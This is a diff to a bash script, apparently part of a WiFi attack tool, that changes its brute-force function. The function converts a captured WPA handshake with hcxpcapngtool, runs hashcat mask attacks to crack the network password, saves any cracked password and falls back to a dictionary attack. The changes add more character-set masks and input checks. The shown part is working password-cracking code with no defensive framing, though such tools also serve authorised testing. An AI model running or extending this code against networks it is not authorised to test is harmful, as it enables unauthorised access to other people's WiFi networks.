@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.4.1 25/1/25 01:20
+# version: 3.4.2 25/1/25 03:37
 
 
 ### FIX ###
@@ -581,22 +581,17 @@ function dictionary_attack() {
 # Brute-Force attack
 # ------------------------------
 function brute-force_attack() {
-
     hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
     echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"
-    
+
     # Ask user for password length
     while true; do
         read -p "Enter password length (Wi-Fi min: 8): " password_length
-
-        # If the user presses Enter, set password_length to 8
         if [[ -z "$password_length" ]]; then
             password_length=8
             echo "default is 8"
             break
         fi
-
-        # Validate password length
         if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
             break
         else
@@ -604,35 +599,46 @@ function brute-force_attack() {
         fi
     done
 
-    # Ask user if they want to try every possible combination or customize each position
     while true; do
         full_mask=""
-
         echo -e "\n\e[1mChoose how to run the Brute-Force:\e[0m"
-        echo -e "1) Try every possible combination           (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
+        echo -e "1) Try every possible combination          ?a   -   (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
         echo -e "2) Customize each position of the password:"
-        echo "   1. Uppercase                    ?u   -   (ABC)"
-        echo "   2. Lowercase                    ?l   -   (abc)"
-        echo "   3. Numbers                      ?d   -   (123)"
-        echo "   4. Special character            ?s   -   (!@#)"
-        echo "   5. Uppercase + Numbers          ?1   -   (ABC-123)"
-        echo "   6. All character types          ?a   -   (ABC-abc-123-!@#)"
-        echo "   7. Enter a specific character:  __"
+        echo "   1.  Uppercase                           ?u   -   (ABC)"
+        echo "   2.  Lowercase                           ?l   -   (abc)"
+        echo "   3.  Numbers                             ?d   -   (123)"
+        echo "   4.  Special character                   ?s   -   (!@#)"
+        echo "   5.  Uppercase + Numbers                 ?1   -   (ABC-123)"
+        echo "   6.  Lowercase + Numbers                 ?2   -   (abc-123)"
+        echo "   7.  Uppercase + Lowercase               ?3   -   (ABC-abc)"
+        echo "   8.  Uppercase + Lowercase + Numbers     ?4   -   (ABC-abc-123)"        
+        echo "   9.  All character types                 ?a   -   (ABC-abc-123-!@#)"
+        echo "   10. Enter a specific character: __"
         echo -e "\n"
 
-        read -p "Enter your choice (1-2): " option
-
+	while true; do
+	    echo -n "Enter your choice (1-2): "
+	    read option
+	    if [[ "$option" -eq 1 || "$option" -eq 2 ]]; then
+		break
+	    else
+		echo -e "\e[1;31mInvalid option.\e[0m"
+		sleep 1
+		tput cuu1; tput el; tput cuu1; tput el;
+	    fi
+	done
+        
         if [[ "$option" -eq 1 ]]; then
             echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
             char_set="?a"
-
-            # Generate the full mask
             for (( i=0; i<password_length; i++ )); do
                 full_mask+="$char_set"
             done
             break
+
         elif [[ "$option" -eq 2 ]]; then
             positions=()
+            charset=""
             for (( i=1; i<=password_length; i++ )); do
                 tput cuu1; tput el; tput cuu1; tput el;
                 echo -n -e "\e[1mCurrent mask:\e[0m "
@@ -642,15 +648,18 @@ function brute-force_attack() {
                 echo
 
                 while true; do
-                    read -p "Choose an option for position $i/$password_length  (Choose 1-7): " choice
+                    read -p "Choose an option for position $i/$password_length  (Choose 1-10): " choice
                     case "$choice" in
                         1) positions+=("?u"); break;; 
                         2) positions+=("?l"); break;; 
                         3) positions+=("?d"); break;;
                         4) positions+=("?s"); break;;
-                        5) positions+=("?1"); charset="-1 ?u?d"; break;;  
-                        6) positions+=("?a"); break;;                                                                                     
-                        7) 
+                        5) positions+=("?1"); charset+="-1 ?u?d "; break;;  
+                        6) positions+=("?2"); charset+="-2 ?l?d "; break;;
+                        7) positions+=("?3"); charset+="-3 ?u?l "; break;;
+                        8) positions+=("?4"); charset+="-4 ?u?l?d "; break;;
+                        9) positions+=("?a"); break;;                         
+                        10)
                             while true; do
                                 read -p "  Enter the specific character for position $i: " specific_char
                                 if [[ ${#specific_char} -eq 1 ]]; then
@@ -669,15 +678,13 @@ function brute-force_attack() {
                                 fi
                             done
                             ;;
-                        *) echo "Invalid choice. Please enter a valid option."
+                        *) echo -e "\e[1;31mInvalid choice!\e[0m Please enter a valid option (1-10)." && sleep 2;
                            tput cuu1; tput el; tput cuu1; tput el;;
                     esac
                 done
             done
             full_mask=$(IFS=; echo "${positions[*]}")
-            break 
-        else
-            echo "Invalid option. Please enter 1-2."
+            break
         fi
     done
 
@@ -685,9 +692,9 @@ function brute-force_attack() {
 
     # Run hashcat with the correct options
     if [[ -n "$charset" ]]; then
-        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
+        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset $full_mask --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
     else
-        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
+        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $full_mask --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
     fi
            
     echo
@@ -702,20 +709,23 @@ function brute-force_attack() {
         echo -e "\n\033[1;31m\033[1mCouldn't cracked with Brute-Force with this masking: $full_mask\033[0m\n"
         sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
         echo
-	read -p "Do you want to run a dictionary attack (Y/n)? " choice
-	case $choice in
-	    y|Y)
-		dictionary_attack
-		;;
-	    n|N)
-		another_scan_prompt
-		;;
-	    *)
-		echo "Invalid choice. Please enter 'y' or 'n'."
-		;;
-	esac        
-    fi
+        read -p "Do you want to run a dictionary attack (Y/n)? " choice
+        case $choice in
+            y|Y)
+                dictionary_attack
+                ;;
+            n|N)
+                another_scan_prompt
+                ;;
+            *)
+                echo "Invalid choice. Please enter 'y' or 'n'."
+                ;;
+        esac        
+    fi    
 }
+
+
+
 
 
 # -----------------
